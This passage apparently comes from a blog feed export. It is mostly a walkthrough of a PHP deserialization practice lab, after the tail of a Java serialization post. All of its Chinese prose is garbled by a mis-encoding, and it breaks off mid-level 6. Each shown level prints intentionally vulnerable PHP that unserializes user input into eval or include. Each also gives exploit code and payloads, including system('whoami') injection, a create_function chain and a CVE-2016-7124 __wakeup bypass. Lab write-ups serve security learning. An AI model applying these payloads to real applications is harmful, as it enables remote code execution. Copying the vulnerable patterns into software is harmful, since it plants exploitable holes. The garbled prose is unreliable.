å¯¹è±¡è¾“å…¥æµï¼š<code>ObjectInputStream</code>å°†åºåˆ—åŒ–å­—ç¬¦ä¸²é€šè¿‡<code>InputStream</code>ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡</p></li><li><p><code>ObjectOutputStream </code>å¯¹è±¡è¾“å‡ºæµï¼š<code>ObjectOutputStream</code>å°†Javaå¯¹è±¡çš„åŸå§‹æ•°æ®ç±»å‹å’Œå›¾å½¢å†™å…¥<code>OutputStream</code>ã€‚</p></li></ul><p>è¿™ä¸ªä¸¤ä¸ªç±»çš„ä¸€ä¸ªå…³ç³»</p><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png"></p><p>ä¸¤ä¸ªå…³é”®çš„æ–¹æ³•</p><ul><li><code>ObjectInputStream#readObject()</code> ä»<code>ObjectInputStream</code>è¯»å–ä¸€ä¸ªå¯¹è±¡ã€‚  è¯»å–å¯¹è±¡çš„ç±»ï¼Œç±»çš„ç­¾åä»¥åŠç±»çš„éç¬æ€å’Œéé™æ€å­—æ®µçš„å€¼ä»¥åŠå…¶æ‰€æœ‰è¶…ç±»å‹ã€‚  å¯ä»¥ä½¿ç”¨<code>writeObject</code>å’Œ<code>readObject</code>æ–¹æ³•è¦†ç›–ç±»çš„é»˜è®¤ååºåˆ—åŒ–ã€‚  è¿™ä¸ªå¯¹è±¡å¼•ç”¨çš„å¯¹è±¡è¢«ä¼ é€’æ€§åœ°è¯»å–ï¼Œä»¥ä¾¿é€šè¿‡<code>readObject</code>é‡æ„ä¸€ä¸ªå®Œæ•´çš„å¯¹è±¡å›¾ã€‚</li><li><code>ObjectOutputStream#wirteObject() </code>å°†æŒ‡å®šçš„å¯¹è±¡å†™å…¥<code>ObjectOutputStream</code>ã€‚  å†™å…¥å¯¹è±¡çš„ç±»ï¼Œç±»çš„ç­¾åä»¥åŠç±»çš„éç¬æ€å’Œéé™æ€å­—æ®µçš„å€¼ä»¥åŠå…¶æ‰€æœ‰è¶…ç±»å‹ã€‚  å¯ä»¥ä½¿ç”¨<code>writeObject</code>å’Œ<code>readObject</code>æ–¹æ³•è¦†ç›–ç±»çš„é»˜è®¤åºåˆ—åŒ–ã€‚  ç”±è¯¥å¯¹è±¡å¼•ç”¨çš„å¯¹è±¡è¢«ä¼ é€’æ€§åœ°å†™å…¥ï¼Œä»¥ä¾¿å¯ä»¥é€šè¿‡<code>ObjectInputStream</code>é‡æ„å¯¹è±¡çš„å®Œæ•´ç­‰ä»·å›¾ã€‚</li></ul><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“åºåˆ—åŒ–çš„ç±»ï¼Œè‡ªå®šä¹‰çš„ä¸€ä¸ª<code>readObject()</code>æˆ–<code>writeObject()</code>æ—¶ï¼Œä¼šä¼˜å…ˆè°ƒç”¨è‡ªå®šä¹‰çš„</p><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png"></p><p>ç›®å‰ï¼ŒåŸºæœ¬ä¸Šåˆ°è¿™å°±å·®ä¸å¤šäº†ï¼Œåç»­éœ€è¦ç»§ç»­æ·±å…¥åˆ†æåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å…·ä½“å®ç°ç­‰ã€‚ã€‚ã€‚</p><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://blog.csdn.net/yudianxiaoxiao/article/details/114539931">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä½œç”¨</a></li><li><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¨è®²è§£</a></li><li><a href="https://blog.csdn.net/weixin_36482976/article/details/114351264">javaåºåˆ—åŒ–è¯¦è§£_Javaåºåˆ—åŒ–æ ¼å¼è§£æ</a></li><li><a href="https://www.cnblogs.com/dudadi/p/8001061.html">staticã€transientä¿®é¥°çš„å±æ€§ä¸èƒ½è¢«åºåˆ—åŒ–</a></li><li><a href="https://songly.blog.csdn.net/article/details/118118431?spm=1001.2014.3001.5502">3-javaå®‰å…¨â€”â€”javaåºåˆ—åŒ–æœºåˆ¶</a></li><li><a href="https://xz.aliyun.com/t/8686#toc-5">SerializationDumperè¾…åŠ©ç ”ç©¶ysoserial URLDNSååºåˆ—åŒ–åŸç†</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPååºåˆ—åŒ–é¶åœº</title>
    <link href="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>æä»£ç å®¡è®¡ä¸ä¼šååºåˆ—åŒ–æ€ä¹ˆå¯ä»¥å‘¢ï¼Œæ­£å¥½åˆçœ‹åˆ°äº†è¿™ä¸ªååºåˆ—åŒ–çš„é¶åœºï¼Œäºæ˜¯ä¹å°±ç©äº†ä¸€ä¸‹è¿™ä¸ªé¶åœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url"># é¡¹ç›®åœ°å€<br>https://github.com/fine-1/php-SER-libs<br></code></pre></td></tr></table></figure><h3 id="0x01-å…³å¡"><a href="#0x01-å…³å¡" class="headerlink" title="0x01 å…³å¡"></a>0x01 å…³å¡</h3><h4 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;act);<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span>=unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br><br><br><span class="hljs-variable">$a</span>-&gt;action();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾ˆç®€å•çš„ååºåˆ—åŒ–ï¼Œç›´æ¥ä¼ å…¥åºåˆ—åŒ–çš„å¯¹è±¡å°±å¯ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>=<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> a;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/1.png"></p><h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># level2 æºç </span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br><span class="hljs-keyword">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// user=&quot;daydream&quot;,pass=&quot;ok&quot;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;login())<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">// æœ€ç»ˆç›®çš„</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å¯¹è±¡åœ¨è¿›è¡Œå®ä¾‹åŒ–çš„æ—¶å€™ï¼Œè‹¥å­˜åœ¨<code>__construct()</code>ä¼šä¼˜å…ˆè°ƒç”¨æ„é€ å‡½æ•°</p><p>è¿™é‡Œæƒ³è¦<code>echo $flag</code>ï¼Œå°±éœ€è¦<code>login()</code> <code>return 1</code></p><p>æƒ³è¦<code>return 1 </code>å°±å¿…é¡»æ»¡è¶³<code>$this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;</code></p><p>è¿™é‡Œå°±éœ€è¦è°ƒç”¨<code>__construct()</code>ï¼Œå°±éœ€è¦åœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œä¼ å…¥ç›¸åº”çš„å‚æ•°å€¼ï¼Œä»è€Œç»™ç±»çš„å±æ€§è¿›è¡Œèµ‹å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// user=&quot;daydream&quot;,pass=&quot;ok&quot;</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> mylogin(<span class="hljs-string">&quot;daydream&quot;</span>,<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/2.png"></p><h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p>è¿™å…³è·Ÿä¸Šä¸€å…³åŸºæœ¬ä¸€æ ·ï¼Œåªä¸è¿‡ä¼ å‚ä½ç½®å˜æˆäº†<code>cookie</code>ä½ç½®ï¼ŒæŠ“ä¸ªåŒ…åœ¨<code>cookie</code>é‡Œé¢ä¼ å…¥åˆšåˆšçš„å­—ç¬¦ä¸²å°±å¯ä»¥äº†ï¼Œæˆ–è€…ä½¿ç”¨hackbaræ”¹ä¸‹cookieçš„å†…å®¹å°±å¯ä»¥äº†</p><h4 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)//ææ„å‡½æ•°ï¼Œå¯¹è±¡åœ¨é”€æ¯æ—¶è°ƒç”¨</span><br><span class="hljs-function">        </span>&#123;        <br>                unserialize(<span class="hljs-keyword">$this</span>-&gt;key)();<span class="hljs-comment">// ç»“å°¾æœ‰ä¸ªæ‹¬å·ï¼Œå¯å˜å‡½æ•°</span><br>        &#125; <span class="hljs-comment">// è°ƒç”¨GetFlagç±»ä¸­çš„get_flag()</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//æœ€ç»ˆç›®çš„</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">$this</span>-&gt;action;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>(<span class="hljs-string">&#x27;flag&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥åˆ†æåŠ exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;                    <span class="hljs-comment">// keyåº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)//ææ„å‡½æ•°ï¼Œå¯¹è±¡åœ¨é”€æ¯æ—¶è°ƒç”¨</span><br><span class="hljs-function">    </span>&#123;<br>        unserialize(<span class="hljs-keyword">$this</span>-&gt;key)();<span class="hljs-comment">// ç»“å°¾æœ‰ä¸ªæ‹¬å·ï¼Œå¯å˜å‡½æ•°</span><br>    &#125; <span class="hljs-comment">// è°ƒç”¨GetFlagç±»ä¸­çš„get_flag()</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;;&#125;system(&quot;whoami&quot;);//&#x27;</span>;<span class="hljs-comment">// é—­åˆå‰é¢ï¼Œæ³¨é‡Šåé¢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;create_function&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//æœ€ç»ˆç›®çš„</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">$this</span>-&gt;action;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> func;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> GetFlag;<br><span class="hljs-variable">$a</span>-&gt;key = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;get_flag&quot;</span>));<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// è¾“å‡ºï¼šO:4:&quot;func&quot;:1:&#123;s:3:&quot;key&quot;;s:123:&quot;a:2:&#123;i:0;O:7:&quot;GetFlag&quot;:2:&#123;s:4:&quot;code&quot;;s:21:&quot;;&#125;system(&quot;whoami&quot;);//&quot;;s:6:&quot;action&quot;;s:15:&quot;create_function&quot;;&#125;i:1;s:8:&quot;get_flag&quot;;&#125;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h4><p>è¿™å…³ä¸»è¦æ˜¯åºåˆ—åŒ–æ ¼å¼è¿‡æ»¤ä¸CVE-2016-7124</p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/4.png" style="zoom:80%;"><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/5.png" style="zoom:80%;"><p>çœ‹ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// åŒ…å«flag.phpï¼Œæœ€ç»ˆæ‰“å°å‡ºflag</span><br>            <span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">$this</span>-&gt;file);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// CVE-2016-7124ç»•è¿‡__wakeup()</span><br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-keyword">echo</span> show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>,<span class="hljs-literal">true</span>);<span class="hljs-comment">// å…ˆåˆ¤æ–­è¾“å…¥æ˜¯å¦ä¸ºç©º</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))&#123;<span class="hljs-comment">// æ­£åˆ™è¿‡æ»¤åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Are you daydreaming?&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            unserialize(<span class="hljs-variable">$cmd</span>);<span class="hljs-comment">// ååºåˆ—åŒ–æ“ä½œ</span><br>        &#125;<br>    &#125;<br><span class="hljs-comment">//sercet in flag.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™å…³å°±æ˜¯ç»•è¿‡<code>__wakeup()</code>ï¼Œç»•è¿‡æ­£åˆ™çš„è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">$this</span>-&gt;file);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> secret(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// è¾“å‡ºO:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="hljs-variable">$flag</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$flag</span> = str_replace(<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;+6&#x27;</span>,<span class="hljs-variable">$flag</span>);<span class="hljs-comment">// ç»•è¿‡æ­£åˆ™ï¼Œåºåˆ—åŒ–æ ¼å¼è¿‡æ»¤</span><br><span class="hljs-variable">$flag</span> = str_replace(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-variable">$flag</span>);<span class="hljs-comment">// CVE-2016-7124ç»•è¿‡__wakeup()</span><br><span class="hljs-comment">// O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/6.png"></p><h4 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$comm</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$com</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;comm = <span class="hljs-variable">$com</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;comm);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>];<br><span class="hljs-variable">$param</span>=str_replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;daydream&quot;</span>,<span class="hljs-variable">$param</span>);<span 